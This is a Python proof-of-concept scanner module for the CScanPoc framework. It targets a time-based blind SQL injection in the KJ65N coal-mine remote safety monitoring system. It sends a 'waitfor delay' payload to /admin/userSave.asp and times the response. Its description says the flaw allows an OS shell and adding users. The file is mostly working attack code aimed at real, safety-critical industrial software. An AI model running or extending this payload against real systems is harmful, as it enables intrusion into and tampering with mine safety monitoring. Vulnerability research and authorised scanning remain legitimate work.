# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'KJ65N_0000' # 平台漏洞编号，留空
    name = 'KJ65N煤矿安全监控系统 通用 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        KJ65N煤矿远程监控安全预警系统 通用 sql注入3处(可直接os-shell 添加用户)
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0148855' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'KJ65N煤矿安全监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ad2ed189-1c4e-41cf-a8af-6bc5a73b777c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            start_time1=time.time()
            code1, head, res, errcode, _ = hh.http(arg)
            true_time=time.time()-start_time1
            start_time2=time.time()
            
            payloads = ("/admin/userSave.asp?userid=123456789%20waitfor%20delay%20'0:0:5&do=delete",
                )
            for p in payloads:
                
                url = arg + p
                code2, head, res, errcode, _ = hh.http(url)
                flase_time=time.time()-start_time2
                if code1==200 and code2==200 and true_time<2 and flase_time>5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()